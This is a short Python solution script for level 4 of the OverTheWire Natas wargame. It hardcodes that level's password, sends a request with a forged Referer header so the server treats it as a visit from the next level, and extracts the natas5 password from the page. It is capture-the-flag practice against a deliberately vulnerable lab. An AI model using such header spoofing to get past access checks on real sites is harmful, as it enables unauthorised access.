#!/usr/bin/python3
import re
import requests

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org' % (username)
auth = (username, password)
headers = {'Referer' : 'http://natas5.natas.labs.overthewire.org/'}

print(url)

response = requests.get(url, auth=auth, headers=headers)

print(response.text)

next_password = (re.findall("natas5 is (.*)",response.text))[0]

print(next_password)
